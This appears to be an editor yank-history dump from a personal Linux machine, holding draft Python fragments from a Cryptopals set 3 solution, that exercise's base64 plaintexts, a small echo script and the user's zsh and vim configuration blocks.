accc4a6aef7653498bcf65507244b7f5|file:///home/neo/Documents/epl448/disaster-tweets/svc_classifier.py|49|12|v|python
	sigmoid
a29c6c26e453548957297f0e8b530aa9|file:///home/neo/Documents/epl448/final.csv|1|1|V|
	dense,tfidf,clear_data,stem,lemmatize,add_location,add_keywords,score
fe55a42ae7273e7639b20454362c85ab|file:///home/neo/Documents/epl448/check_values.sh|4|1|V|sh
	echo 'test'
5af7c07885c2bd84a2c0f6ebd2cdd209|file:///home/neo/Documents/epl448/check_values.sh|6|16|v|sh
	[ True False ]
30df2dd0325e8eae4d56b76782f3b031|file:///home/neo/Documents/epl448/check_values.sh|7|8|V|sh
	        echo 'test'
c2d7d7e1b1d46c98eea3d09d5ba0ac1a|file:///home/neo/Documents/epl448/check_values.sh|7|9|V|sh
	        echo "${titles[$i]}"
a3ef1966a0450914cc3f451d4ba21115|file:///home/neo/Documents/epl448/check_values.sh|5|1|V|sh
	echo "${titles[0]}"
f0b3532b9bc9be2afda08dea7ed678e1|file:///home/neo/Documents/epl448/check_values.sh|9|9|V|sh
	        echo $(($i+1))
7a0afe57b048aed01a02e00739899505|file:///home/neo/.vimrc|8|1|V|vim
	let g:tex_flavor = 'latex'
76b6085f9f5703eb09431e2c4a6f3c17|file:///home/neo/.vimrc|8|12|V|vim
	" Tex flavor
	let g:tex_flavor = 'latex'
	
56911641d56b41b34ca6f68c936b79b7|file:///home/neo/pt|1|1|V|
	'SSBoYXZlIG1ldCB0aGVtIGF0IGNsb3NlIG9mIGRheQ==',
	'Q29taW5nIHdpdGggdml2aWQgZmFjZXM=',
	'RnJvbSBjb3VudGVyIG9yIGRlc2sgYW1vbmcgZ3JleQ==',
	'RWlnaHRlZW50aC1jZW50dXJ5IGhvdXNlcy4=',
	'SSBoYXZlIHBhc3NlZCB3aXRoIGEgbm9kIG9mIHRoZSBoZWFk',
	'T3IgcG9saXRlIG1lYW5pbmdsZXNzIHdvcmRzLA==',
	'T3IgaGF2ZSBsaW5nZXJlZCBhd2hpbGUgYW5kIHNhaWQ=',
	'UG9saXRlIG1lYW5pbmdsZXNzIHdvcmRzLA==',
	'QW5kIHRob3VnaHQgYmVmb3JlIEkgaGFkIGRvbmU=',
	'T2YgYSBtb2NraW5nIHRhbGUgb3IgYSBnaWJl',
	'VG8gcGxlYXNlIGEgY29tcGFuaW9u',
	'QXJvdW5kIHRoZSBmaXJlIGF0IHRoZSBjbHViLA==',
	'QmVpbmcgY2VydGFpbiB0aGF0IHRoZXkgYW5kIEk=',
	'QnV0IGxpdmVkIHdoZXJlIG1vdGxleSBpcyB3b3JuOg==',
	'QWxsIGNoYW5nZWQsIGNoYW5nZWQgdXR0ZXJseTo=',
	'QSB0ZXJyaWJsZSBiZWF1dHkgaXMgYm9ybi4=',
	'VGhhdCB3b21hbidzIGRheXMgd2VyZSBzcGVudA==',
	'SW4gaWdub3JhbnQgZ29vZCB3aWxsLA==',
	'SGVyIG5pZ2h0cyBpbiBhcmd1bWVudA==',
	'VW50aWwgaGVyIHZvaWNlIGdyZXcgc2hyaWxsLg==',
	'V2hhdCB2b2ljZSBtb3JlIHN3ZWV0IHRoYW4gaGVycw==',
	'V2hlbiB5b3VuZyBhbmQgYmVhdXRpZnVsLA==',
	'U2hlIHJvZGUgdG8gaGFycmllcnM/',
	'VGhpcyBtYW4gaGFkIGtlcHQgYSBzY2hvb2w=',
	'QW5kIHJvZGUgb3VyIHdpbmdlZCBob3JzZS4=',
	'VGhpcyBvdGhlciBoaXMgaGVscGVyIGFuZCBmcmllbmQ=',
	'V2FzIGNvbWluZyBpbnRvIGhpcyBmb3JjZTs=',
	'SGUgbWlnaHQgaGF2ZSB3b24gZmFtZSBpbiB0aGUgZW5kLA==',
	'U28gc2Vuc2l0aXZlIGhpcyBuYXR1cmUgc2VlbWVkLA==',
	'U28gZGFyaW5nIGFuZCBzd2VldCBoaXMgdGhvdWdodC4=',
	'VGhpcyBvdGhlciBtYW4gSSBoYWQgZHJlYW1lZA==',
	'QSBkcnVua2VuLCB2YWluLWdsb3Jpb3VzIGxvdXQu',
	'SGUgaGFkIGRvbmUgbW9zdCBiaXR0ZXIgd3Jvbmc=',
	'VG8gc29tZSB3aG8gYXJlIG5lYXIgbXkgaGVhcnQs',
	'WWV0IEkgbnVtYmVyIGhpbSBpbiB0aGUgc29uZzs=',
	'SGUsIHRvbywgaGFzIHJlc2lnbmVkIGhpcyBwYXJ0',
	'SW4gdGhlIGNhc3VhbCBjb21lZHk7',
	'SGUsIHRvbywgaGFzIGJlZW4gY2hhbmdlZCBpbiBoaXMgdHVybiw=',
	'VHJhbnNmb3JtZWQgdXR0ZXJseTo=',
	'QSB0ZXJyaWJsZSBiZWF1dHkgaXMgYm9ybi4=',
14a1e764d211bbb59eac4e8c3515c914|file:///home/neo/cryptopals/set3/set3_sol.py|109|1|V|python
	            ]
3a87cd747b976145cb4a9662582a116d|file:///home/neo/cryptopals/set3/set3_sol.py|108|19|V|python
	    plaintexts = [
	        'SSBoYXZlIG1ldCB0aGVtIGF0IGNsb3NlIG9mIGRheQ==',
	        'Q29taW5nIHdpdGggdml2aWQgZmFjZXM=',
	        'RnJvbSBjb3VudGVyIG9yIGRlc2sgYW1vbmcgZ3JleQ==',
	        'RWlnaHRlZW50aC1jZW50dXJ5IGhvdXNlcy4=',
	        'SSBoYXZlIHBhc3NlZCB3aXRoIGEgbm9kIG9mIHRoZSBoZWFk',
	        'T3IgcG9saXRlIG1lYW5pbmdsZXNzIHdvcmRzLA==',
	        'T3IgaGF2ZSBsaW5nZXJlZCBhd2hpbGUgYW5kIHNhaWQ=',
	        'UG9saXRlIG1lYW5pbmdsZXNzIHdvcmRzLA==',
	        'QW5kIHRob3VnaHQgYmVmb3JlIEkgaGFkIGRvbmU=',
	        'T2YgYSBtb2NraW5nIHRhbGUgb3IgYSBnaWJl',
	        'VG8gcGxlYXNlIGEgY29tcGFuaW9u',
	        'QXJvdW5kIHRoZSBmaXJlIGF0IHRoZSBjbHViLA==',
	        'QmVpbmcgY2VydGFpbiB0aGF0IHRoZXkgYW5kIEk=',
	        'QnV0IGxpdmVkIHdoZXJlIG1vdGxleSBpcyB3b3JuOg==',
	        'QWxsIGNoYW5nZWQsIGNoYW5nZWQgdXR0ZXJseTo=',
	        'QSB0ZXJyaWJsZSBiZWF1dHkgaXMgYm9ybi4=',
	        'VGhhdCB3b21hbidzIGRheXMgd2VyZSBzcGVudA==',
	        'SW4gaWdub3JhbnQgZ29vZCB3aWxsLA==',
	        'SGVyIG5pZ2h0cyBpbiBhcmd1bWVudA==',
	        'VW50aWwgaGVyIHZvaWNlIGdyZXcgc2hyaWxsLg==',
	        'V2hhdCB2b2ljZSBtb3JlIHN3ZWV0IHRoYW4gaGVycw==',
	        'V2hlbiB5b3VuZyBhbmQgYmVhdXRpZnVsLA==',
	        'U2hlIHJvZGUgdG8gaGFycmllcnM/',
	        'VGhpcyBtYW4gaGFkIGtlcHQgYSBzY2hvb2w=',
	        'QW5kIHJvZGUgb3VyIHdpbmdlZCBob3JzZS4=',
	        'VGhpcyBvdGhlciBoaXMgaGVscGVyIGFuZCBmcmllbmQ=',
	        'V2FzIGNvbWluZyBpbnRvIGhpcyBmb3JjZTs=',
	        'SGUgbWlnaHQgaGF2ZSB3b24gZmFtZSBpbiB0aGUgZW5kLA==',
	        'U28gc2Vuc2l0aXZlIGhpcyBuYXR1cmUgc2VlbWVkLA==',
	        'U28gZGFyaW5nIGFuZCBzd2VldCBoaXMgdGhvdWdodC4=',
	        'VGhpcyBvdGhlciBtYW4gSSBoYWQgZHJlYW1lZA==',
	        'QSBkcnVua2VuLCB2YWluLWdsb3Jpb3VzIGxvdXQu',
	        'SGUgaGFkIGRvbmUgbW9zdCBiaXR0ZXIgd3Jvbmc=',
	        'VG8gc29tZSB3aG8gYXJlIG5lYXIgbXkgaGVhcnQs',
	        'WWV0IEkgbnVtYmVyIGhpbSBpbiB0aGUgc29uZzs=',
	        'SGUsIHRvbywgaGFzIHJlc2lnbmVkIGhpcyBwYXJ0',
	        'SW4gdGhlIGNhc3VhbCBjb21lZHk7',
	        'SGUsIHRvbywgaGFzIGJlZW4gY2hhbmdlZCBpbiBoaXMgdHVybiw=',
	        'VHJhbnNmb3JtZWQgdXR0ZXJseTo=',
	        'QSB0ZXJyaWJsZSBiZWF1dHkgaXMgYm9ybi4=' ]
328c9da8ccb84d4d3af730461f26a7e4|file:///home/neo/cryptopals/set3/set3_sol.py|19|1|V|python
	    plaintexts = [
	        'SSBoYXZlIG1ldCB0aGVtIGF0IGNsb3NlIG9mIGRheQ==',
	        'Q29taW5nIHdpdGggdml2aWQgZmFjZXM=',
	        'RnJvbSBjb3VudGVyIG9yIGRlc2sgYW1vbmcgZ3JleQ==',
	        'RWlnaHRlZW50aC1jZW50dXJ5IGhvdXNlcy4=',
	        'SSBoYXZlIHBhc3NlZCB3aXRoIGEgbm9kIG9mIHRoZSBoZWFk',
	        'T3IgcG9saXRlIG1lYW5pbmdsZXNzIHdvcmRzLA==',
	        'T3IgaGF2ZSBsaW5nZXJlZCBhd2hpbGUgYW5kIHNhaWQ=',
	        'UG9saXRlIG1lYW5pbmdsZXNzIHdvcmRzLA==',
	        'QW5kIHRob3VnaHQgYmVmb3JlIEkgaGFkIGRvbmU=',
	        'T2YgYSBtb2NraW5nIHRhbGUgb3IgYSBnaWJl',
	        'VG8gcGxlYXNlIGEgY29tcGFuaW9u',
	        'QXJvdW5kIHRoZSBmaXJlIGF0IHRoZSBjbHViLA==',
	        'QmVpbmcgY2VydGFpbiB0aGF0IHRoZXkgYW5kIEk=',
	        'QnV0IGxpdmVkIHdoZXJlIG1vdGxleSBpcyB3b3JuOg==',
	        'QWxsIGNoYW5nZWQsIGNoYW5nZWQgdXR0ZXJseTo=',
	        'QSB0ZXJyaWJsZSBiZWF1dHkgaXMgYm9ybi4=',
	        'VGhhdCB3b21hbidzIGRheXMgd2VyZSBzcGVudA==',
	        'SW4gaWdub3JhbnQgZ29vZCB3aWxsLA==',
	        'SGVyIG5pZ2h0cyBpbiBhcmd1bWVudA==',
	        'VW50aWwgaGVyIHZvaWNlIGdyZXcgc2hyaWxsLg==',
	        'V2hhdCB2b2ljZSBtb3JlIHN3ZWV0IHRoYW4gaGVycw==',
	        'V2hlbiB5b3VuZyBhbmQgYmVhdXRpZnVsLA==',
	        'U2hlIHJvZGUgdG8gaGFycmllcnM/',
	        'VGhpcyBtYW4gaGFkIGtlcHQgYSBzY2hvb2w=',
	        'QW5kIHJvZGUgb3VyIHdpbmdlZCBob3JzZS4=',
	        'VGhpcyBvdGhlciBoaXMgaGVscGVyIGFuZCBmcmllbmQ=',
	        'V2FzIGNvbWluZyBpbnRvIGhpcyBmb3JjZTs=',
	        'SGUgbWlnaHQgaGF2ZSB3b24gZmFtZSBpbiB0aGUgZW5kLA==',
	        'U28gc2Vuc2l0aXZlIGhpcyBuYXR1cmUgc2VlbWVkLA==',
	        'U28gZGFyaW5nIGFuZCBzd2VldCBoaXMgdGhvdWdodC4=',
	        'VGhpcyBvdGhlciBtYW4gSSBoYWQgZHJlYW1lZA==',
	        'QSBkcnVua2VuLCB2YWluLWdsb3Jpb3VzIGxvdXQu',
	        'SGUgaGFkIGRvbmUgbW9zdCBiaXR0ZXIgd3Jvbmc=',
	        'VG8gc29tZSB3aG8gYXJlIG5lYXIgbXkgaGVhcnQs',
	        'WWV0IEkgbnVtYmVyIGhpbSBpbiB0aGUgc29uZzs=',
	        'SGUsIHRvbywgaGFzIHJlc2lnbmVkIGhpcyBwYXJ0',
	        'SW4gdGhlIGNhc3VhbCBjb21lZHk7',
	        'SGUsIHRvbywgaGFzIGJlZW4gY2hhbmdlZCBpbiBoaXMgdHVybiw=',
	        'VHJhbnNmb3JtZWQgdXR0ZXJseTo=',
	        'QSB0ZXJyaWJsZSBiZWF1dHkgaXMgYm9ybi4=' ]
	
88350076147118c165a9269b3d62f30b|file:///home/neo/pt|1|1|V|
	b'SSBoYXZlIG1ldCB0aGVtIGF0IGNsb3NlIG9mIGRheQ==',
	b'Q29taW5nIHdpdGggdml2aWQgZmFjZXM=',
	b'RnJvbSBjb3VudGVyIG9yIGRlc2sgYW1vbmcgZ3JleQ==',
	b'RWlnaHRlZW50aC1jZW50dXJ5IGhvdXNlcy4=',
	b'SSBoYXZlIHBhc3NlZCB3aXRoIGEgbm9kIG9mIHRoZSBoZWFk',
	b'T3IgcG9saXRlIG1lYW5pbmdsZXNzIHdvcmRzLA==',
	b'T3IgaGF2ZSBsaW5nZXJlZCBhd2hpbGUgYW5kIHNhaWQ=',
	b'UG9saXRlIG1lYW5pbmdsZXNzIHdvcmRzLA==',
	b'QW5kIHRob3VnaHQgYmVmb3JlIEkgaGFkIGRvbmU=',
	b'T2YgYSBtb2NraW5nIHRhbGUgb3IgYSBnaWJl',
	b'VG8gcGxlYXNlIGEgY29tcGFuaW9u',
	b'QXJvdW5kIHRoZSBmaXJlIGF0IHRoZSBjbHViLA==',
	b'QmVpbmcgY2VydGFpbiB0aGF0IHRoZXkgYW5kIEk=',
	b'QnV0IGxpdmVkIHdoZXJlIG1vdGxleSBpcyB3b3JuOg==',
	b'QWxsIGNoYW5nZWQsIGNoYW5nZWQgdXR0ZXJseTo=',
	b'QSB0ZXJyaWJsZSBiZWF1dHkgaXMgYm9ybi4=',
	b'VGhhdCB3b21hbidzIGRheXMgd2VyZSBzcGVudA==',
	b'SW4gaWdub3JhbnQgZ29vZCB3aWxsLA==',
	b'SGVyIG5pZ2h0cyBpbiBhcmd1bWVudA==',
	b'VW50aWwgaGVyIHZvaWNlIGdyZXcgc2hyaWxsLg==',
	b'V2hhdCB2b2ljZSBtb3JlIHN3ZWV0IHRoYW4gaGVycw==',
	b'V2hlbiB5b3VuZyBhbmQgYmVhdXRpZnVsLA==',
	b'U2hlIHJvZGUgdG8gaGFycmllcnM/',
	b'VGhpcyBtYW4gaGFkIGtlcHQgYSBzY2hvb2w=',
	b'QW5kIHJvZGUgb3VyIHdpbmdlZCBob3JzZS4=',
	b'VGhpcyBvdGhlciBoaXMgaGVscGVyIGFuZCBmcmllbmQ=',
	b'V2FzIGNvbWluZyBpbnRvIGhpcyBmb3JjZTs=',
	b'SGUgbWlnaHQgaGF2ZSB3b24gZmFtZSBpbiB0aGUgZW5kLA==',
	b'U28gc2Vuc2l0aXZlIGhpcyBuYXR1cmUgc2VlbWVkLA==',
	b'U28gZGFyaW5nIGFuZCBzd2VldCBoaXMgdGhvdWdodC4=',
	b'VGhpcyBvdGhlciBtYW4gSSBoYWQgZHJlYW1lZA==',
	b'QSBkcnVua2VuLCB2YWluLWdsb3Jpb3VzIGxvdXQu',
	b'SGUgaGFkIGRvbmUgbW9zdCBiaXR0ZXIgd3Jvbmc=',
	b'VG8gc29tZSB3aG8gYXJlIG5lYXIgbXkgaGVhcnQs',
	b'WWV0IEkgbnVtYmVyIGhpbSBpbiB0aGUgc29uZzs=',
	b'SGUsIHRvbywgaGFzIHJlc2lnbmVkIGhpcyBwYXJ0',
	b'SW4gdGhlIGNhc3VhbCBjb21lZHk7',
	b'SGUsIHRvbywgaGFzIGJlZW4gY2hhbmdlZCBpbiBoaXMgdHVybiw=',
	b'VHJhbnNmb3JtZWQgdXR0ZXJseTo=',
	b'QSB0ZXJyaWJsZSBiZWF1dHkgaXMgYm9ybi4=',
d04fb4e3f7dffb834ed54d579e28a95e|file:///home/neo/cryptopals/set3/set3_sol.py|164|5|V|python
	    print(max_len)
3d37ecf1c9685c16ef4ed4fa431739c1|file:///home/neo/cryptopals/set3/set3_sol.py|165|5|V|python
	    print(scores)
68b29862a2bc326496785bbefc2b360b|file:///home/neo/cryptopals/set3/set3_sol.py|166|9|V|python
	        for i in range(max_len):
ff88c01f596b55c426aa0d14e39828cb|file:///home/neo/cryptopals/set3/set3_sol.py|168|13|V|python
	            print(c)
86773301468904f2e6b09aa3f20bf960|file:///home/neo/cryptopals/set3/set3_sol.py|167|13|V|python
	            print(pos)
0466d05e182b55c187a4d46cf1aead8a|file:///home/neo/cryptopals/set3/set3_sol.py|173|9|V|python
	        be
550aec4589c842f76025ba3cd293c814|file:///home/neo/cryptopals/set3/set3_sol.py|172|1|V|python
	    for i, score in enumerate(scores):
5e226089947eb55e8912f0dab72487a1|file:///home/neo/cryptopals/set3/set3_sol.py|165|1|V|python
	    best = [0 * max_len]
4a26f8809e2981cbd6d9eb84b6777c7d|file:///home/neo/cryptopals/set3/set3_sol.py|164|16|v|python
	 * max_len
79a99fccc2810323032c831f1f34499e|file:///home/neo/cryptopals/set3/set3_sol.py|164|5|V|python
	    scores = {}
997358097c3abc310751a07e9af26ccc|file:///home/neo/cryptopals/set3/set3_sol.py|178|9|V|python
	        best[i] = max(scores_)
5dd4a6adb169bbe6e42f3b29a232437f|file:///home/neo/cryptopals/set3/set3_sol.py|177|5|V|python
	    for i, score in enumerate(score_list):
f6862be7aab3a58b3f95d6dd57b07439|file:///home/neo/cryptopals/set3/set3_sol.py|178|5|V|python
	        print(score)
7ae427ccf5820a38cb608caaf926fc7a|file:///home/neo/cryptopals/set3/set3_sol.py|177|5|V|python
	    print(score_list)
edf5163cfc0e3be344e373c529eabc21|file:///home/neo/cryptopals/set3/set3_sol.py|178|9|V|python
	        print(len(score_list))
528148af234df1fc7bdb72dc366ec9c1|file:///home/neo/cryptopals/set3/set3_sol.py|177|5|V|python
	    print(len(score_list))
833c819e33000a4454c30d333a7460e9|file:///home/neo/cryptopals/set3/set3_sol.py|176|9|V|python
	        score_list.append(scores)
01ea1edca0500e9c09f6095d27fe6ac5|file:///home/neo/cryptopals/set3/set3_sol.py|176|5|V|python
	    score_list.append(scores)
43440b50f3d6fce87fb29234357cff99|file:///home/neo/cryptopals/set3/set3_sol.py|168|16|V|python
	        scores = {}
	        for i in range(256):
	            scores[i] = 0
d9b0a4bb7deab0b05a207a9c716f7bbc|file:///home/neo/cryptopals/set3/set3_sol.py|170|9|V|python
	        score_list[i] = scores
0e4d9a3f2787b1cb570c719ff6bf26e3|file:///home/neo/cryptopals/set3/set3_sol.py|170|12|v|python
	[0] * max_len
d4c173f5c1d88b9b5fe3d55157d86605|file:///home/neo/cryptopals/set3/set3_sol.py|179|19|v|python
	score.get(max(score.values()))
6afea5846b59e1ffb6d1de2a4dec5f99|file:///home/neo/cryptopals/set3/set3_sol.py|179|9|V|python
	        print(score.get(max(score.values())))
446501053769c06c565094b26d26e8ef|file:///home/neo/cryptopals/set3/set3_sol.py|179|19|v|python
	stats
a234629f24316a3cb43a89b28bf9ebaf|file:///home/neo/cryptopals/set3/set3_sol.py|179|15|v|python
	max(score.items(), key=operator.itemgetter(1))[0]
5863bb976acdd9d97286b742c9cca1be|file:///home/neo/cryptopals/set3/set3_sol.py|181|19|v|python
	enumerate(
7af2f36184e9a38681cbf6572c6d2f3b|file:///home/neo/cryptopals/set3/set3_sol.py|183|17|V|python
	                print(i)
fba3164aad2b562bc8ee642a485d2881|file:///home/neo/cryptopals/set3/set3_sol.py|183|13|V|python
	                print(pos)
0bbef0416e60a13b5fc83e6cbde72724|file:///home/neo/cryptopals/set3/set3_sol.py|185|5|V|python
	    print(plaintexts[0])
26feb306ffee3e5291ad999d9ac8bad2|file:///home/neo/cryptopals/set3/set3_sol.py|184|5|V|python
	    for plaintext in plaintexts:
aa131f4263658637e1c2b3d350e8714f|file:///home/neo/cryptopals/set3/set3_sol.py|180|5|V|python
	    for ciphertext in ciphertexts:
2ca31d70a14f2edbfa147a5dcba5e25d|file:///home/neo/cryptopals/set3/set3_sol.py|183|24|V|python
	    for plaintext in plaintexts:
	        print(plaintext)
28d218bcab2be75818839a083c8a2b78|file:///home/neo/.zshrc.pre-oh-my-zsh|3|1|V|zsh
	# Enable colors and change prompt:
	autoload -U colors && colors
	PS1="%B%{$fg[green]%}%n@%M:%{$fg[blue]%}%~%{$reset_color%}$%b "
	
	setopt appendhistory autocd
	unsetopt beep nomatch
	
	# History in cache directory:
	HISTSIZE=10000
	SAVEHIST=10000
	HISTFILE=~/.histfile
	
	export TERMINAL=/home/neo/st/st
	
	# Basic auto/tab complete:
	autoload -U compinit
	zstyle ':completion:*' menu select
	zmodload zsh/complist
	compinit
	_comp_options+=(globdots)		# Include hidden files.
	
	# Use vim keys in tab complete menu:
	bindkey -M menuselect 'h' vi-backward-char
	bindkey -M menuselect 'k' vi-up-line-or-history
	bindkey -M menuselect 'l' vi-forward-char
	bindkey -M menuselect 'j' vi-down-line-or-history
	bindkey -v '^?' backward-delete-char
	
	# vi mode
	bindkey -v
	export KEYTIMEOUT=1
	
	# Man pages colors
	
	export LESS_TERMCAP_mb=$'\e[1;32m'
	export LESS_TERMCAP_md=$'\e[1;32m'
	export LESS_TERMCAP_me=$'\e[0m'
	export LESS_TERMCAP_se=$'\e[0m'
	export LESS_TERMCAP_so=$'\e[01;33m'
	export LESS_TERMCAP_ue=$'\e[0m'
	export LESS_TERMCAP_us=$'\e[1;4;31m'
	
	# enable color support of ls and also add handy aliases
	if [ -x /usr/bin/dircolors ]; then
	    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
	    alias ls='ls --color=auto'
	    #alias dir='dir --color=auto'
	    #alias vdir='vdir --color=auto'
	
	    alias grep='grep --color=auto'
	    alias fgrep='fgrep --color=auto'
	    alias egrep='egrep --color=auto'
	fi
	
	# Change cursor shape for different vi modes.
	function zle-keymap-select {
	  if [[ ${KEYMAP} == vicmd ]] ||
	     [[ $1 = 'block' ]]; then
	    echo -ne '\e[1 q'
	  elif [[ ${KEYMAP} == main ]] ||
	       [[ ${KEYMAP} == viins ]] ||
	       [[ ${KEYMAP} = '' ]] ||
	       [[ $1 = 'beam' ]]; then
	    echo -ne '\e[5 q'
	  fi
	}
	zle -N zle-keymap-select
	zle-line-init() {
	    zle -K viins # initiate `vi insert` as keymap (can be removed if `bindkey -V` has been set elsewhere)
	    echo -ne "\e[5 q"
	}
	zle -N zle-line-init
	echo -ne '\e[5 q' # Use beam shape cursor on startup.
	preexec() { echo -ne '\e[5 q' ;} # Use beam shape cursor for each new prompt.
	
	# Edit line in vim with ctrl-e:
	autoload edit-command-line; zle -N edit-command-line
	bindkey '^e' edit-command-line
	
	# Load aliases and shortcuts if existent.
	[ -f "$HOME/.config/shortcutrc" ] && source "$HOME/.config/shortcutrc"
	[ -f "$HOME/.config/aliasrc" ] && source "$HOME/.config/aliasrc"
	
	export NVM_DIR="/home/neo/.nvm"
	[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"  # This loads nvm
	
	# Precmd : to emulate bash's PROMPT_COMMAND variable
	precmd(){ 
		pwd > /tmp/whereami
		}
	
	xset +fp /home/neo/.local/share/fonts
	xset fp rehash
	
	# Load zsh-syntax-highlighting; should be last.
	source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh 2>/dev/null
	
	# FZF settings
	export FZF_CTRL_T_COMMAND='ag --hidden --ignore .git -l -g ""'
	[ -f ~/.fzf.zsh ] && source ~/.fzf.zsh
	
	# Hadoop settings
	export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
	export PATH=$PATH:/usr/local/java/bin
	#HADOOP ENVIRONMENT
	export HADOOP_HOME=/usr/local/hadoop
	export HADOOP_CONF_DIR=/usr/local/hadoop/etc/hadoop
	export HADOOP_MAPRED_HOME=/usr/local/hadoop
	export HADOOP_COMMON_HOME=/usr/local/hadoop
	export HADOOP_HDFS_HOME=/usr/local/hadoop
	export YARN_HOME=/usr/local/hadoop
	export PATH=$PATH:/usr/local/hadoop/bin
	export PATH=$PATH:/usr/local/hadoop/sbin
	#HADOOP NATIVE PATH:
	export HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/native
	export HADOOP_OPTS=‚Äú-Djava.library.path=$HADOOP_PREFIX/lib/native‚Äù
	export YARN_RESOURCEMANAGER_OPTS="--add-modules=ALL-SYSTEM"
	
	# Key bindings
	setxkbmap -option caps:swapescape
	setxkbmap -option ctrl:ralt_rctrl
	
	export PATH="$HOME/.rbenv/bin:$PATH"
	eval "$(rbenv init -)"
	export PATH="$HOME/.rbenv/plugins/ruby-build/bin:$PATH"
	# ctf-tools: PATH setup
	export PATH="$HOME/ctf-tools/bin:$PATH"
	export PATH="$HOME/wabt/bin:$PATH"
	# ctf-tools: gem install
	export PATH="$PATH:/home/neo/.gem/ruby/2.7.0/bin"
	export PATH="$PATH:/usr/local/go/bin"
	
	# aliases
	alias install="sudo apt-get install"
	# alias python="ipython"
	alias python3="ipython3"
	
	# >>> conda initialize >>>
	# !! Contents within this block are managed by 'conda init' !!
	__conda_setup="$('/media/neo/Storage/anaconda3/bin/conda' 'shell.bash' 'hook' 2> /dev/null)"
	if [ $? -eq 0 ]; then
	    eval "$__conda_setup"
	else
	    if [ -f "/media/neo/Storage/anaconda3/etc/profile.d/conda.sh" ]; then
	        . "/media/neo/Storage/anaconda3/etc/profile.d/conda.sh"
	    else
	        export PATH="/media/neo/Storage/anaconda3/bin:$PATH"
	    fi
	fi
	# unset __conda_setup
	# conda deactivate
	# <<< conda initialize <<<
1981be6808373a1f089218ff3c2340d3|file:///home/neo/.zshrc|26|1|V|zsh
	# Uncomment the following line to disable bi-weekly auto-update checks.
	# DISABLE_AUTO_UPDATE="true"
3290c2f159f49b7348c773ce6aa4f995|file:///home/neo/.zshrc|13|1|V|zsh
	# Set list of themes to pick from when loading at random
	# Setting this variable when ZSH_THEME=random will cause zsh to load
	# a theme from this variable instead of looking in ~/.oh-my-zsh/themes/
	# If set to an empty array, this variable will have no effect.
	# ZSH_THEME_RANDOM_CANDIDATES=( "robbyrussell" "agnoster" )
	
39a5137d3ea18cd7dc911f94b853789e|file:///home/neo/.zshrc|29|1|V|zsh
	# Uncomment the following line to disable colors in ls.
	# DISABLE_LS_COLORS="true"
	
487c67ae7122b8922da280a6d47b2414|file:///home/neo/.zshrc|225|1|V|zsh
	
	# >>> conda initialize >>>
	# !! Contents within this block are managed by 'conda init' !!
	__conda_setup="$('/media/neo/Storage/anaconda3/bin/conda' 'shell.bash' 'hook' 2> /dev/null)"
	if [ $? -eq 0 ]; then
	    eval "$__conda_setup"
	else
	    if [ -f "/media/neo/Storage/anaconda3/etc/profile.d/conda.sh" ]; then
	        . "/media/neo/Storage/anaconda3/etc/profile.d/conda.sh"
	    else
	        export PATH="/media/neo/Storage/anaconda3/bin:$PATH"
	    fi
	fi
	# unset __conda_setup
	# conda deactivate
	# <<< conda initialize <<<
cc1a79802aaf32ef06b4433aab5a18df|file:///home/neo/.zshrc|193|1|V|zsh
	##HADOOP ENVIRONMENT
	#export HADOOP_HOME=/usr/local/hadoop
	#export HADOOP_CONF_DIR=/usr/local/hadoop/etc/hadoop
	#export HADOOP_MAPRED_HOME=/usr/local/hadoop
	#export HADOOP_COMMON_HOME=/usr/local/hadoop
	#export HADOOP_HDFS_HOME=/usr/local/hadoop
	#export YARN_HOME=/usr/local/hadoop
	#export PATH=$PATH:/usr/local/hadoop/bin
	#export PATH=$PATH:/usr/local/hadoop/sbin
	##HADOOP NATIVE PATH:
	#export HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/native
	#export HADOOP_OPTS=‚Äú-Djava.library.path=$HADOOP_PREFIX/lib/native‚Äù
	#export YARN_RESOURCEMANAGER_OPTS="--add-modules=ALL-SYSTEM"
67549231496b97ba4786bf28ff10c9d7|file:///home/neo/.zshrc|65|1|V|zsh
	# export MANPATH="/usr/local/man:$MANPATH"
446d326a6487c34b9713baf52c53bd1c|file:///home/neo/.zshrc|77|1|V|zsh
	
	# Set personal aliases, overriding those provided by oh-my-zsh libs,
	# plugins, and themes. Aliases can be placed here, though oh-my-zsh
	# users are encouraged to define aliases within the ZSH_CUSTOM folder.
	# For a full list of active aliases, run `alias`.
	#
	# Example aliases
	# alias zshconfig="mate ~/.zshrc"
	# alias ohmyzsh="mate ~/.oh-my-zsh"
	#
fd7051eb970aec6cd4be8f0f640df0f7|file:///home/neo/.zshrc|66|1|V|zsh
	# export LANG=en_US.UTF-8
	
	# Preferred editor for local and remote sessions
	# if [[ -n $SSH_CONNECTION ]]; then
	#   export EDITOR='vim'
	# else
	#   export EDITOR='mvim'
	# fi
	
	# Compilation flags
	# export ARCHFLAGS="-arch x86_64"
c1616f3c8962623e339417e6c16a5fb9|file:///home/neo/.zshrc|11|12|v|zsh
	robbyrussell
4284d1ed4a7fd2f0ba2ac200ce2e04da|file:///home/neo/.zshrc|11|12|v|zsh
	afowler
2cf65311942298fbb81d01b952b0945d|file:///home/neo/.zshrc|11|12|v|zsh
	aliwnpeabody
d1d3d5636a5ee2e12c153aaac13882b6|file:///home/neo/.zshrc|11|12|v|zsh
	awesomepanda
044247a3ce3f3648c22602e3913a9089|file:///home/neo/.zshrc|11|12|v|zsh
	darkblood
37df2d9965525e849ca24f41be04488c|file:///home/neo/.zshrc|11|12|v|zsh
	flazz
f4b418eba9c0b3d4901880b743cbbaff|file:///home/neo/cryptopals/set3/set3_sol.py|184|45|v|python
	latin
5844675122b3be4e8b75cb27943baff0|file:///home/neo/cryptopals/set3/set3_sol.py|183|5|V|python
	    for i, plaintext in enplaintexts:
c486a5f72d2132a951fc4a3a65a0860f|file:///home/neo/cryptopals/set3/set3_sol.py|183|9|V|python
	        plaintext[i]= bytes(plaintext.decode('utf-8').lower(), 'utf-8')
3e066e295dc60aa464d9a801a1e30159|file:///home/neo/cryptopals/set3/set3_sol.py|182|30|v|python
	bytes(chr((c ^ best[pos])).lower(), 'utf-8')
4bcdf1cdc8c3673e6168011c65a6c9f0|file:///home/neo/cryptopals/set3/set3_sol.py|182|36|v|python
	chr((c ^ best[pos])).lower()
